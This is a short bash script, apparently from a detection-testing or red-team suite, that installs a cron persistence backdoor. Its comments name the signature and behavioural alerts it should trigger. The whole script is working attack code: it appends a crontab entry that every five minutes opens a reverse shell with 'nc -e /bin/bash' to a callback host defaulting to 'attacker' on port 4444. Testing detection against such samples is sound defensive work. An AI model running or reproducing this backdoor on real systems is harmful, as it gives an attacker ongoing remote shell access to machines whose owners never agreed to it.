#!/bin/bash
# Cron Persistence — installs a cron backdoor for callback
# Detectable by: signature scan (Persist.Cron.Generic), behavioral (PERSISTENCE_INSTALLED)
C2="${1:-attacker}"
PORT="${2:-4444}"

echo "[*] Installing cron persistence..."
(crontab -l 2>/dev/null; echo "*/5 * * * * /bin/bash -c 'nc -w 2 ${C2} ${PORT} -e /bin/bash 2>/dev/null'") | crontab -
echo "[+] Cron backdoor installed"
crontab -l
